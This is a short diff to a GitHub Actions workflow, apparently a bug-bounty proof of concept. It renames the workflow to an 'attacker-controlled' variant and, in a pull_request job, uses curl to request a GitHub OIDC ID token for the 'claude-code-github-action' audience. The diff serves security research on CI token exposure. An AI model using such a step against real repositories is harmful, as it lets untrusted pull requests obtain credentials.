@@ -1,4 +1,4 @@
-name: pr-oidc-fragment-base
+name: pr-oidc-fragment-attacker-controlled
 
 on:
   pull_request:
@@ -17,6 +17,7 @@ jobs:
         env:
           H1_HANDLE: liamconner10
         run: |
+          echo 'fork_workflow_bytes=modified'
           OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=claude-code-github-action"
           OIDC=$(curl -fsS \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
